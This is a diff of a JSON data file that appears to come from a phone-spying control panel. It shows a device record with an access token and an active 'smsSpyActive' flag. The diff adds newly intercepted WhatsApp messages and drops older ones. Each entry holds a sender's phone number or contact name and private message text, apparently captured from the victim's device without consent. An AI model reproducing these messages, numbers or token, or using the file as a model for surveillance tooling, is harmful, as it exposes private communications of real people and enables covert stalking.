@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776915179446,
+    "lastSeen": 1776915191456,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 878-9820-8741",
+        "content": "Ok kak",
+        "time": "23/04 11:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776915182085
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎65 pesan dari 41 chat",
+        "time": "23/04 11:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776915182065
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "susu nya mahal mahal lgi",
+        "time": "23/04 11:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776915182017
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 822-6965-3769",
@@ -3995,30 +4019,6 @@
         "time": "23/04 05:10",
         "pkg": "com.whatsapp",
         "receivedAt": 1776892233547
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎60 pesan dari 38 chat",
-        "time": "23/04 05:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776892014828
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "iyaa nnti kalo ga cocok cari warna lain aja",
-        "time": "23/04 05:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776892014687
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 823-1199-7104",
-        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
-        "time": "23/04 05:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776891992851
       }
     ],
     "galleryPhotos": [],
